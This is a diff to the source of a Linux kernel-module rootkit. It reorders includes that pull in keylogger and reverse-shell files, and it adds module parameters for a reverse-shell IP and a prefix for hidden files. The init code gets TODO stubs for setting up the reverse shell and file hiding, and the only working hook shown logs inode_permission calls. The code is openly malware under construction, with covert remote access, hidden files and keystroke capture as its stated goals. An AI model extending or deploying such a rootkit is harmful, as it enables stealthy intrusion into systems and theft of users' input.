@@ -3,13 +3,13 @@
  * @author  Aaron Lichtman, Arch Gupta  and Brandon Weidner
  * @brief   A rootkit. TODO: Expand description
  */
+#include <linux/fs.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/fs.h>
-#include "khook/engine.c"
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
+#include "khook/engine.c"
 
 MODULE_AUTHOR("Aaron Lichtman");
 MODULE_AUTHOR("Arch Gupta");
@@ -18,7 +18,12 @@ MODULE_DESCRIPTION("Linux rootkit.");
 MODULE_VERSION("0.1");
 MODULE_LICENSE("GPL");
 
-// Look into module_param() and MODULE_PARM_DESC for adding parameters
+// Parameters.
+
+module_param(rev_shell_ip, charp, NULL);
+MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
+module_param(hidden_file_prefix, charp, NULL);
+MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
 
 // TODO: Figure out if this is needed at all.
 // /**
@@ -46,28 +51,35 @@ static int khook_fget(unsigned int fd) {
 // Example hook for testing build process.
 KHOOK(inode_permission);
 static int khook_inode_permission(struct inode* inode, int mask) {
-	int ret = 0;
-	ret = KHOOK_ORIGIN(inode_permission, inode, mask);
-	printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
-	return ret;
+    int ret = 0;
+    ret = KHOOK_ORIGIN(inode_permission, inode, mask);
+    printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
+    return ret;
 }
-
 
 /**
  * Rootkit module initialization.
  */
 static int __init rootkit_init(void) {
-	printk(KERN_INFO "Initializing rootkit.\n");
-	khook_init();
-	return 0;
+    printk(KERN_INFO "Initializing rootkit.\n");
+    khook_init();
+    if (!strcmp(rev_shell_ip, "")) {
+        // TODO: Set up reverse shell.
+    }
+
+    if (!strcmp(hidden_file_prefix, "")) {
+        // TODO: Set up hidden files.
+    }
+
+    return 0;
 }
 
 /**
  * Called at exit. All cleanup should be done here.
  */
 static void __exit rootkit_exit(void) {
-	printk(KERN_INFO "Cleaning up rootkit.\n");
-	khook_cleanup();
+    printk(KERN_INFO "Cleaning up rootkit.\n");
+    khook_cleanup();
 }
 
 module_init(rootkit_init);
